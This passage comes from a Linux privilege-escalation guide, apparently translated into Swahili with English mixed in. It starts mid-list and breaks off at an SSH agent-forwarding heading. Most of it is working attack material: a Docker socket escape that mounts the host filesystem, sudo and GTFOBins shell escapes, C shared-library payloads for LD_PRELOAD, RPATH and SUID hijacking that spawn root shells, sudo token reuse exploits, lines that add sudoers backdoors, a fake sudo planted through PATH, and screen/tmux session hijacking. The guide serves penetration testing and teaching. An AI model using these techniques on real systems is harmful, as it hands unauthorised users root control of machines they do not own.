2.  **Create a Container:** Send a request to create a container that mounts the host system's root directory.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Start the newly created container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Use `socat` to establish a connection to the container, enabling command execution within it.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Baada ya kuanzisha muunganisho wa `socat`, unaweza kutekeleza amri moja kwa moja ndani ya container ikiwa na root-level access kwenye filesystem ya host.

### Wengine

Kumbuka kwamba ikiwa una write permissions juu ya docker socket kwa sababu uko **inside the group `docker`** una [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group). Ikiwa [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Angalia **more ways to break out from docker or abuse it to escalate privileges** katika:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

If you find that you can use the **`ctr`** command read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

If you find that you can use the **`runc`** command read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus ni mfumo tata wa **inter-Process Communication (IPC) system** unaowawezesha applications kuingiliana na kushirikiana data kwa ufanisi. Imetengenezwa kwa mfumo wa kisasa wa Linux na inatoa mfumo imara wa mawasiliano kati ya applications mbalimbali.

Mfumo ni wenye kubadilika, unaounga mkono IPC ya msingi ambayo inaboresha kubadilishana data kati ya processes, ikifikiriwa kama **enhanced UNIX domain sockets**. Zaidi ya hayo, husaidia katika kutangaza matukio au signals, ikichangia muingiliano rahisi kati ya vipengele vya mfumo. Kwa mfano, signal kutoka kwa Bluetooth daemon kuhusu simu inayokuja inaweza kusababisha music player kutulia, kuboresha uzoefu wa mtumiaji. Aidha, D-Bus ina mfumo wa remote object, unaorahisisha maombi ya services na invocation za methods kati ya applications, kupunguza ugumu wa michakato ya zamani.

D-Bus inafanya kazi kwa mtiririko wa **allow/deny model**, ikidhibiti ruhusa za ujumbe (method calls, signal emissions, n.k.) kulingana na athari ya mkusanyiko wa rule za sera zinazolingana. Sera hizi zinaelezea maingiliano na bus, na zinaweza kuruhusu privilege escalation kupitia matumizi mabaya ya ruhusa hizi.

Mfano wa sera kama hiyo katika `/etc/dbus-1/system.d/wpa_supplicant.conf` umeonyeshwa, ukielezea ruhusa kwa mtumiaji root kumiliki, kutuma, na kupokea ujumbe kutoka kwa `fi.w1.wpa_supplicant1`.

Sera ambazo hazina mtumiaji au group maalum zinahusu kwa ujumla, wakati sera za muktadha wa "default" zinatumika kwa wote wasiowasilishwa na sera maalum nyingine.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Jifunze jinsi ya enumerate na exploit D-Bus communication hapa:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Mtandao**

Inavutia kila wakati enumerate mtandao na kubaini nafasi ya mashine.

### Generic enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Bandari zilizofunguliwa

Daima angalia huduma za mtandao zinazofanya kazi kwenye mashine ambazo haukuweza kuingiliana nazo kabla ya kuifikia:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Angalia ikiwa unaweza sniff traffic. Ikiwa unaweza, unaweza kuwa na uwezo wa kupata credentials.
```
timeout 1 tcpdump
```
## Watumiaji

### Uorodheshaji wa Kawaida

Angalia **wewe ni nani**, ni **privileges** gani ulizonazo, ni **watumiaji** gani wako kwenye mfumo, ni nani anaweza **login** na ni nani ana **root privileges**:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### UID Kubwa

Baadhi ya toleo za Linux zilipata hitilafu (bug) inayowaruhusu watumiaji wenye **UID > INT_MAX** kupandisha vibali. Taarifa zaidi: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
Exploit it using: **`systemd-run -t /bin/bash`**

### Vikundi

Angalia kama wewe ni **mwanachama wa kundi fulani** ambacho kinaweza kukupa vibali vya root:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Ubao wa kunakili

Angalia kama kuna kitu chochote cha kuvutia kilicho ndani ya ubao wa kunakili (ikiwa inawezekana)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Sera ya Nenosiri
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Nywila Zilizojulikana

Kama unajua **nywila yoyote** ya mazingira, **jaribu kuingia kwa kila mtumiaji** ukitumia nywila hiyo.

### Su Brute

Kama hukujali kusababisha kelele nyingi na binaries za `su` na `timeout` ziko kwenye kompyuta, unaweza kujaribu kufanya brute-force dhidi ya mtumiaji kwa kutumia [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) na parameter ya `-a` pia inajaribu kufanya brute-force watumiaji.

## Matumizi mabaya ya PATH inayoweza kuandikwa

### $PATH

Kama utagundua kwamba unaweza **kuandika ndani ya kabrasha fulani ya $PATH** unaweza kuweza kuongeza hadhi kwa **kuunda backdoor ndani ya kabrasha linaloweza kuandikwa** kwa jina la amri ambayo itatekelezwa na mtumiaji mwingine (bora ikiwa root) na ambayo **haitapakiwa kutoka kabrasha kilichoko kabla** ya kabrasha lako linaloweza kuandikwa katika $PATH.

### SUDO and SUID

Unaweza kupewa ruhusa kutekeleza amri fulani kwa kutumia sudo au zinaweza kuwa na suid bit. Angalia kwa kutumia:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Baadhi ya **amri zisizotarajiwa zinakuwezesha kusoma na/au kuandika faili au hata kutekeleza amri.** Kwa mfano:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Usanidi wa Sudo unaweza kumruhusu mtumiaji kutekeleza amri fulani kwa kutumia ruhusa za mtumiaji mwingine bila kujua nywila.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
Katika mfano huu mtumiaji `demo` anaweza kuendesha `vim` kama `root`, sasa ni rahisi kupata shell kwa kuongeza ssh key kwenye root directory au kwa kuita `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Maelekezo haya yanamruhusu mtumiaji **set an environment variable** wakati wa kutekeleza jambo:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Mfano huu, **kutokana na mashine ya HTB Admirer**, ulikuwa **nyeti** kwa **PYTHONPATH hijacking** ili kupakia maktaba yoyote ya python wakati wa kutekeleza script kama root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV imehifadhiwa kupitia sudo env_keep → root shell

Ikiwa sudoers inahifadhi `BASH_ENV` (mfano, `Defaults env_keep+="ENV BASH_ENV"`), unaweza kutumia tabia ya kuanzisha isiyo ya kuingiliana ya Bash kuendesha msimbo wowote kama root unapoitisha amri iliyoruhusiwa.

- Kwa nini inafanya kazi: Kwa shells zisizo za kuingiliana, Bash inatumia `$BASH_ENV` na kusoma faili hilo kabla ya kuendesha script lengwa. Sera nyingi za sudo ziruhusu kuendesha script au shell wrapper. Ikiwa `BASH_ENV` imehifadhiwa na sudo, faili yako itasomwa kwa ruhusa za root.

- Mahitaji:
- Kanuni ya sudo unayoweza kuendesha (lengo lolote linaloitisha `/bin/bash` isiyo ya kuingiliana, au script yoyote ya bash).
- `BASH_ENV` iwepo katika `env_keep` (angalia kwa `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Kuimarisha:
- Ondoa `BASH_ENV` (na `ENV`) kutoka `env_keep`, pendelea `env_reset`.
- Epuka shell wrappers kwa sudo-allowed commands; tumia minimal binaries.
- Fikiria sudo I/O logging na alerting wakati preserved env vars zinapotumika.

### Njia za kuepuka utekelezaji wa sudo

**Jump** kusoma faili nyingine au kutumia **symlinks**. Kwa mfano katika sudoers file: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Ikiwa **wildcard** imetumika (\*), ni rahisi zaidi:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Hatua za kinga**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary without command path

Ikiwa **sudo permission** imetolewa kwa amri moja tu **bila kubainisha path**: _hacker10 ALL= (root) less_, unaweza ku-exploit kwa kubadilisha PATH variable
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Mbinu hii pia inaweza kutumika ikiwa binary ya **suid** **inaendesha amri nyingine bila kutaja njia yake (hakikisha kila wakati kwa kutumia** _**strings**_ **yaliyomo ya binary ya SUID isiyo ya kawaida)**.

[Payload examples to execute.](payloads-to-execute.md)

### Binary ya SUID yenye njia ya amri

Ikiwa binary ya **suid** **inaendesha amri nyingine kwa kutaja path**, basi unaweza kujaribu **export a function** itakayopangwa kwa jina la amri ambayo faili ya suid inaiita.

Kwa mfano, ikiwa binary ya suid inaita _**/usr/sbin/service apache2 start**_ unapaswa kujaribu kuunda function na ku-export:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Kisha, unapomuita suid binary, function hii itaendeshwa

### LD_PRELOAD & **LD_LIBRARY_PATH**

The **LD_PRELOAD** environment variable hutumika kubainisha moja au zaidi ya shared libraries (.so files) ambazo zitalandishwa na loader kabla ya nyingine zote, ikiwemo maktaba ya kawaida ya C (`libc.so`). Mchakato huu unajulikana kama preloading a library.

Hata hivyo, ili kudumisha usalama wa mfumo na kuzuia kipengele hiki kutumika vibaya, hasa kwa executables za **suid/sgid**, mfumo unatekeleza masharti fulani:

- Loader haizingatii **LD_PRELOAD** kwa executables ambapo real user ID (_ruid_) haifanani na effective user ID (_euid_).
- Kwa executables zilizo na suid/sgid, maktaba pekee zilizopo katika njia za kawaida ambazo pia ni suid/sgid ndizo zinazolandishwa mapema.

Privilege escalation inaweza kutokea ikiwa una uwezo wa kuendesha amri kwa `sudo` na matokeo ya `sudo -l` yanajumuisha taarifa **env_keep+=LD_PRELOAD**. Mpangilio huu huruhusu environment variable ya **LD_PRELOAD** kudumu na kutambuliwa hata wakati amri zinaendeshwa kwa `sudo`, na hivyo kunaweza kusababisha utekelezaji wa arbitrary code kwa ruhusa zilizoinuliwa.
```
Defaults        env_keep += LD_PRELOAD
```
Hifadhi kama **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Kisha **compile it** ukitumia:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Mwishowe, **escalate privileges** ukiendesha
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Privesc inayofanana inaweza kutumiwa vibaya ikiwa attacker anadhibiti **LD_LIBRARY_PATH** env variable kwa sababu anadhibiti njia ambapo maktaba zitatafutwa.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Unapokutana na binary yenye ruhusa za **SUID** ambazo zinaonekana zisizo za kawaida, ni desturi nzuri kuthibitisha kama inapakia faili za **.so** ipasavyo. Hii inaweza kuchunguzwa kwa kuendesha amri ifuatayo:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Kwa mfano, kukutana na hitilafu kama _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ kunapendekeza uwezekano wa exploitation.

Ili exploit hili, mtu angeendelea kwa kuunda faili ya C, sema _"/path/to/.config/libcalc.c"_, yenye msimbo ufuatao:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
This code, mara itakapokusanywa na kutekelezwa, inalenga elevate privileges kwa kubadilisha file permissions na kutekeleza shell yenye elevated privileges.

Compile C file iliyo hapo juu kuwa shared object (.so) file kwa:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Hatimaye, kuendesha SUID binary iliyoharibika kunapaswa kuamsha exploit, kuruhusu uwezekano wa kuvamiwa kwa mfumo.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Sasa tumeipata SUID binary inayopakia library kutoka kwenye folder tunaweza kuandika, hebu tengeneza library katika folder hiyo kwa jina linalohitajika:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Ikiwa unapata kosa kama
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
hii inamaanisha kwamba maktaba uliyoizalisha inapaswa kuwa na function iitwayo `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) ni orodha iliyoratibiwa ya Unix binaries ambazo mdukuzi anaweza kuzitumia kufaida ili kupitisha vikwazo vya usalama vya ndani. [**GTFOArgs**](https://gtfoargs.github.io/) ni sawa lakini kwa kesi ambapo unaweza **tu kuingiza vigezo** katika amri.

Mradi unakusanya functions halali za Unix binaries ambazo zinaweza kutumiwa vibaya ku-break out restricted shells, escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate the other post-exploitation tasks.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Ikiwa unaweza kuendesha `sudo -l` unaweza kutumia zana [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) kuangalia ikiwa inapata jinsi ya ku-exploit any sudo rule.

### Kutumia tena Sudo Tokens

Katika kesi ambapo una **sudo access** lakini sio password, unaweza escalate privileges kwa **kusubiri utekelezaji wa amri ya sudo kisha kuchukua session token**.

Requirements to escalate privileges:

- Tayari una shell kama user "_sampleuser_"
- "_sampleuser_" ame **tumia `sudo`** kutekeleza kitu katika **dakika 15 zilizopita** (kwa default hiyo ndiyo muda wa sudo token inayoturuhusu kutumia `sudo` bila kuingiza password)
- `cat /proc/sys/kernel/yama/ptrace_scope` is 0
- `gdb` inapatikana (unaweza kuipakia)

(Unaweza kuwasha kwa muda `ptrace_scope` na `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` au kwa kudumu kwa kubadilisha `/etc/sysctl.d/10-ptrace.conf` na kuweka `kernel.yama.ptrace_scope = 0`)

Kama mahitaji haya yote yametimizwa, **unaweza escalate privileges ukitumia:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) itaunda binary `activate_sudo_token` katika _/tmp_. Unaweza kuitumia **kuactivate sudo token katika session yako** (huwezi kupata moja kwa moja root shell, fanya `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **exploit ya pili** (`exploit_v2.sh`) itaunda sh shell katika _/tmp_ **iliyomilikiwa na root na yenye setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **exploit wa tatu** (`exploit_v3.sh`) **itatengeneza faili ya sudoers** itakayofanya **sudo tokens kuwa za milele na kuruhusu watumiaji wote kutumia sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Ikiwa una **write permissions** kwenye folda au kwenye yoyote ya faili zilizoundwa ndani ya folda unaweza kutumia binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) ili **create a sudo token for a user and PID**.\
Kwa mfano, ikiwa unaweza kuandika juu ya faili _/var/run/sudo/ts/sampleuser_ na una shell kama user huyo mwenye PID 1234, unaweza **obtain sudo privileges** bila ya kuhitaji kujua password kwa kufanya:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Faili `/etc/sudoers` na faili zilizomo ndani ya `/etc/sudoers.d` huamua ni nani anaweza kutumia `sudo` na jinsi inavyotumika. Faili hizi **kwa default zinaweza kusomwa tu na mtumiaji root na kikundi root**.\
**Ikiwa** unaweza **kusoma** faili hii unaweza **kupata taarifa za kuvutia**, na ikiwa unaweza **kuandika** faili yoyote utakuwa na uwezo wa **escalate privileges**
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Kama unaweza kuandika, unaweza kutumia vibaya ruhusa hii
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Njia nyingine ya kutumia vibaya ruhusa hizi:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Kuna mbadala kadhaa kwa binary ya `sudo`, kama `doas` kwa OpenBSD — kumbuka kukagua usanidi wake kwenye `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Ikiwa unajua kwamba **mtumiaji kawaida huunganisha kwenye mashine na hutumia `sudo`** ili kuongeza ruhusa na umepata shell ndani ya muktadha wa mtumiaji huyo, unaweza **create a new sudo executable** itakayotekeleza msimbo wako kama root kisha amri ya mtumiaji. Kisha, **modify the $PATH** ya muktadha wa mtumiaji (kwa mfano kwa kuongeza path mpya katika .bash_profile) ili wakati mtumiaji anapoendesha sudo, executable yako ya sudo itatekelezwa.

Kumbuka kwamba ikiwa mtumiaji anatumia shell tofauti (si bash) utahitaji kubadilisha faili nyingine ili kuongeza path mpya. Kwa mfano [sudo-piggyback](https://github.com/APTy/sudo-piggyback) inabadilisha `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Unaweza kupata mfano mwingine katika [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Au kuendesha kitu kama:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Maktaba Iliyoshirikiwa

### ld.so

File `/etc/ld.so.conf` inaonyesha **ambapo faili za usanidi zilizopakiwa zinatoka**. Kwa kawaida, faili hii ina njia ifuatayo: `include /etc/ld.so.conf.d/*.conf`

Hiyo ina maana kwamba faili za usanidi kutoka `/etc/ld.so.conf.d/*.conf` zitasomwa. Faili hizi za usanidi **zinaonyesha kwa folda nyingine** ambapo **maktaba** zitatafutwa. Kwa mfano, maudhui ya `/etc/ld.so.conf.d/libc.conf` ni `/usr/local/lib`. **Hii ina maana kwamba mfumo utafuta maktaba ndani ya `/usr/local/lib`**.

Ikiwa kwa sababu fulani **mtumiaji ana ruhusa ya kuandika** kwenye mojawapo ya njia zilizoashiria: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, faili yoyote ndani ya `/etc/ld.so.conf.d/` au folda yoyote ndani ya faili ya usanidi ndani ya `/etc/ld.so.conf.d/*.conf` anaweza kuwa na uwezo wa kupandisha vibali.\
Tazama **jinsi ya exploit usanidi huu usio sahihi** kwenye ukurasa ufuatao:

{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Kwa kunakili lib ndani ya `/var/tmp/flag15/` itatumiwa na programu katika nafasi hii kama ilivyoainishwa katika kigezo cha `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Kisha unda maktaba ya uovu katika `/var/tmp` kwa kutumia `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities hutoa **sehemu ndogo ya idhini za root zinazopatikana kwa mchakato**. Hii kwa vitendo inaigawa root **idhini katika vitengo vidogo na vinavyotofautiana**. Kila kimoja cha vitengo hivi kinaweza kisha kupewa mchakato kwa kujitegemea. Kwa njia hii seti kamili ya idhini inapunguzwa, na hivyo kupunguza hatari za matumizi mabaya.\
Read the following page to **learn more about capabilities and how to abuse them**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Ruhusa za kabrasha

Katika kabrasha, the **bit for "execute"** inaonyesha kwamba mtumiaji aliyeathirika anaweza "**cd**" kuingia kabrasha.\
The **"read"** bit inaonyesha mtumiaji anaweza **kuorodhesha** **files**, na the **"write"** bit inaonyesha mtumiaji anaweza **kufuta** na **kuunda** **files** mpya.

## ACLs

Access Control Lists (ACLs) zinawakilisha safu ya pili ya ruhusa za hiari, zenye uwezo wa **kuzipita ruhusa za jadi za ugo/rwx**. Ruhusa hizi huongeza udhibiti wa upatikanaji wa faili au kabrasha kwa kuruhusu au kukataa haki kwa watumiaji maalum ambao si wamiliki wala si sehemu ya kundi. Ngazi hii ya **undani inahakikisha usimamizi wa upatikanaji uliosahihi zaidi**. Further details can be found [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Mpa** user "kali" read and write permissions over a file:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Pata** faili zenye ACLs maalum kutoka kwa mfumo:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Fungua vikao vya shell

Katika **matoleo ya zamani** unaweza **hijack** baadhi ya **shell** session za mtumiaji mwingine (**root**).\
Katika **matoleo ya hivi karibuni** utaweza **kuungana** na screen sessions tu za **mtumiaji wako mwenyewe**. Hata hivyo, unaweza kupata **taarifa za kuvutia ndani ya session**.

### screen sessions hijacking

**Orodhesha screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Unganisha kwenye kikao**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Hii ilikuwa tatizo kwa **old tmux versions**. Sikuwa na uwezo wa hijack kikao cha tmux (v2.1) kilichoundwa na root kama mtumiaji asiye na ruhusa.

**Orodhesha vikao vya tmux**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Unganisha kwenye kikao**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** kwa mfano.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

All SSL and SSH keys generated on Debian based systems (Ubuntu, Kubuntu, etc) between September 2006 and May 13th, 2008 may be affected by this bug.\
Hitilafu hii inasababishwa wakati wa kuunda ssh key mpya katika OS hizo, kwani **only 32,768 variations were possible**. Hii inamaanisha kwamba kila uwezekano unaweza kukokotolewa na **having the ssh public key you can search for the corresponding private key**. Unaweza kupata uwezekano uliohesabiwa hapa: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Vigezo vya usanidi vinavyovutia

- **PasswordAuthentication:** Huonyesha kama password authentication inaruhusiwa. Chaguo-msingi ni `no`.
- **PubkeyAuthentication:** Huonyesha kama public key authentication inaruhusiwa. Chaguo-msingi ni `yes`.
- **PermitEmptyPasswords**: Wakati password authentication inaruhusiwa, huonyesha kama server inaruhusu kuingia kwenye akaunti zenye password tupu. Chaguo-msingi ni `no`.

### PermitRootLogin

Huonyesha kama root anaweza kuingia kwa kutumia ssh, chaguo-msingi ni `no`. Thamani zinazowezekana:

- `yes`: root anaweza kuingia kwa kutumia password na private key
- `without-password` or `prohibit-password`: root anaweza kuingia kwa private key pekee
- `forced-commands-only`: Root anaweza kuingia kwa private key pekee na ikiwa chaguo la commands limetumika
- `no` : hapana

### AuthorizedKeysFile

Huonyesha faili zenye public keys ambayo yanaweza kutumika kwa user authentication. Inaweza kuwa na tokens kama `%h`, ambazo zitatumika kuja na home directory. **Unaweza kuonyesha absolute paths** (zinaanza na `/`) au **relative paths kutoka kwenye home ya user**. Kwa mfano:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Uundaji huo utaonyesha kwamba ikiwa utajaribu kuingia kwa kutumia ufunguo **private** wa mtumiaji "**testusername**" ssh italinganisha ufunguo wa umma wa ufunguo wako na zile zilizopo katika `/home/testusername/.ssh/authorized_keys` na `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

